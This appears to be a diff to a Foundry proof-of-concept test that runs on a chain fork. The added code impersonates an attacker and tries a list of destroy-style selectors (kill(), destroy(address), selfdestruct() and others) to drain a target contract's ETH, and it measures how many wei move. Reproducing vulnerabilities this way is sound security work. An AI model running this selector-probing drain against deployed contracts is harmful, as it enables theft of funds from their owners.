@@ -42,25 +42,67 @@ contract PoC is Test {
         assertGt(target.code.length, 0, "target has no code at this fork block");
     }
 
+    /// Attempt one destroy selector. Success is the BALANCE MOVING, not the call
+    /// returning: a no-op or already-guarded function returns successfully and
+    /// sweeps nothing. Observed on a real run — `kill()` returned [Stop], moved
+    /// 0 wei, and a single-candidate harness reported "not reproduced".
+    function _attempt(
+        address attacker,
+        uint256 before,
+        string memory label,
+        bytes memory data
+    ) internal returns (string memory) {
+        vm.prank(attacker);
+        (bool ok,) = target.call(data);
+        console.log("tried", label, ok ? "call returned" : "call reverted");
+        if (ok && target.balance < before) return label;
+        return "";
+    }
+
+    /// The destroy entry point is a GUESS when the target is unverified, and a
+    /// wrong guess is not harmless: it reports "not reproduced" for a
+    /// vulnerability that exists under another name. So try the plausible ones
+    /// before concluding.
+    function _tryDestroy(address attacker, uint256 before) internal returns (string memory used) {
+        used = _attempt(attacker, before, "kill()", abi.encodeWithSignature("kill()"));
+        if (bytes(used).length > 0) return used;
+        used = _attempt(attacker, before, "destroy()", abi.encodeWithSignature("destroy()"));
+        if (bytes(used).length > 0) return used;
+        used = _attempt(attacker, before, "selfdestruct()", abi.encodeWithSignature("selfdestruct()"));
+        if (bytes(used).length > 0) return used;
+        used = _attempt(attacker, before, "terminate()", abi.encodeWithSignature("terminate()"));
+        if (bytes(used).length > 0) return used;
+        used = _attempt(attacker, before, "burn()", abi.encodeWithSignature("burn()"));
+        if (bytes(used).length > 0) return used;
+        used = _attempt(attacker, before, "close()", abi.encodeWithSignature("close()"));
+        if (bytes(used).length > 0) return used;
+        used = _attempt(attacker, before, "suicide()", abi.encodeWithSignature("suicide()"));
+        if (bytes(used).length > 0) return used;
+        used = _attempt(attacker, before, "destroy(address)", abi.encodeWithSignature("destroy(address)", attacker));
+        if (bytes(used).length > 0) return used;
+        used = _attempt(attacker, before, "kill(address)", abi.encodeWithSignature("kill(address)", attacker));
+        if (bytes(used).length > 0) return used;
+        return "";
+    }
+
     function test_destroySweepsBalance() public {
         address attackerEOA = makeAddr("attacker");
         vm.deal(attackerEOA, 1 ether);
         uint256 targetBefore = target.balance;
         require(targetBefore > 0, "target holds no ETH to sweep");
 
-        // TODO: adapt to the target's real destroy function.
-        vm.prank(attackerEOA);
-        (bool ok,) = target.call(
-            abi.encodeWithSignature("destroy(address)", attackerEOA)
-        );
-        if (!ok) {
-            vm.prank(attackerEOA);
-            (ok,) = target.call(abi.encodeWithSignature("destroy()"));
-        }
-        require(ok, "destroy call failed -- adapt to the target's destroy function");
+        string memory used = _tryDestroy(attackerEOA, targetBefore);
+        uint256 drained = targetBefore - target.balance;
+        console.log("destroy entry point that moved ETH:", used);
         console.log("target balance before:", targetBefore);
         console.log("target balance after:", target.balance);
-        assertEq(target.balance, 0, "exploit did not reproduce: target balance not swept");
+        console.log("wei drained:", drained);
+
+        assertGt(
+            drained,
+            0,
+            "no destroy entry point swept the balance. Tried kill(), destroy(), selfdestruct(), terminate(), burn(), close(), suicide(), destroy(address), kill(address). This does NOT establish safety: the destroy function may have another name, take other arguments, or be reachable only by a specific caller."
+        );
     }
 
     function test_forcedEth() public {
